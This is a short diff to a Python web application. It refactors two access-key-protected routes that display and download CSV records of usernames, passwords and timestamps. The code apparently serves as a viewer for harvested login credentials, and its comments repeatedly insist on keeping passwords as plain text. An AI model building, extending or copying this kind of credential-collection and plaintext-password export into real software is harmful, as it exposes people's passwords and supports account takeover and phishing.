@@ -378,12 +378,14 @@ def view_stats(access_key):
             try:
                 with open(path, 'r') as csvfile:
                     reader = csv.DictReader(csvfile)
-                    # Filter to only include username, password, and timestamp
-                    data = [{
-                        'username': row.get('username', ''),
-                        'password': row.get('password', ''),
-                        'timestamp': row.get('timestamp', '')
-                    } for row in reader]
+                    # Transform data to only include relevant fields
+                    for row in reader:
+                        entry = {}
+                        # Only include username, password, and timestamp
+                        entry['username'] = row.get('username', '')
+                        entry['password'] = row.get('password', '')
+                        entry['timestamp'] = row.get('timestamp', '')
+                        data.append(entry)
                 break  # Successfully read data, exit loop
             except Exception as e:
                 continue
@@ -435,14 +437,13 @@ def download_csv(access_key):
             writer.writerow(['username', 'password', 'timestamp'])
             
             # Write data with only the required fields (keep password as plain text)
-            for row in all_data[1:]:
+            for row in all_data[1:]:  # Skip header
                 if len(row) >= 5:  # Make sure the row has enough columns
-                    # Extract only username, password, timestamp (index 2, 3, 4)
-                    username = row[2]
-                    password = row[3]  # Plain text password
-                    timestamp = row[4]
+                    username = row[2]  # username is at index 2
+                    password = row[3]  # password is at index 3
+                    timestamp = row[4]  # timestamp is at index 4
                     
-                    # Write only the required fields with plain text password
+                    # Include only the username, password (as plain text), and timestamp
                     writer.writerow([username, password, timestamp])
         
         # Set the appropriate headers for CSV download
